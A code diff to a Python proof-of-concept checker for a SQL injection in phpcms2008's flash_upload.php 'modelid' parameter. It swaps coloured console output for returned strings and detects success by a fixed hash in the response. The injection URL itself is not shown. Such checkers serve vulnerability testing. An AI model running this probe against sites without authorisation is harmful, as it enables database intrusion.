@@ -8,8 +8,8 @@ description: 文件flash_upload.php中,参数modelid存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class phpcms_flash_upload_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class phpcms_flash_upload_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"63e1f04640e83605c1d177544a5a0488" in req.text:
-                cprint("[+]存在phpcms2008 flash_upload.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在phpcms2008 flash_upload.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = phpcms_flash_upload_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
